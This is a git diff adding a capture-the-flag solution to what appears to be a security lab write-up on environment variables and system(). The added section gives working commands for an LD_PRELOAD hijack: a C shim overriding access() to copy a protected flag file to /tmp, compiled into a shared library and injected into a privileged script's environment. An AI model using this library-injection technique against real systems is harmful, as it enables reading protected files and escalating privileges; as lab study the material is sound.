@@ -66,4 +66,32 @@ In this task, we will use the system() function instead of execve(), which means
 
 ## CTF
 
--
+We present below the code we used to complete the CTF.
+>Write what's in flag.txt to a file in another directory we can access.
+>```
+>echo "#include <stdlib.h>
+>#include <stdio.h>
+>int access(const char *pathname, int mode) { 
+>   system(\"/usr/bin/cat /flags/flag.txt > /tmp/myfile.txt \");
+>   return 0;
+>} " >> printenv.c
+>
+>gcc -fPIC -g -c printenv.c 
+>```
+>Create a library with our printenv.c.
+>```
+>gcc -shared -o libmylib.so.1.0.1 printenv.o -lc 
+>```
+>Preloads the library to env file, which is used in the script back in /flag_reader, so that our code runs before anyother library. 
+>```
+>echo "LD_PRELOAD=/tmp/libmylib.so.1.0.1" >> env 
+>touch myfile.txt
+>```
+>Change file permissions.
+>```
+>chmod 777 myfile.txt 
+>```
+>Immediately after the script in the flag_reader folder is executed to get the content from the file.
+>```
+>cat myfile.txt 
+>```
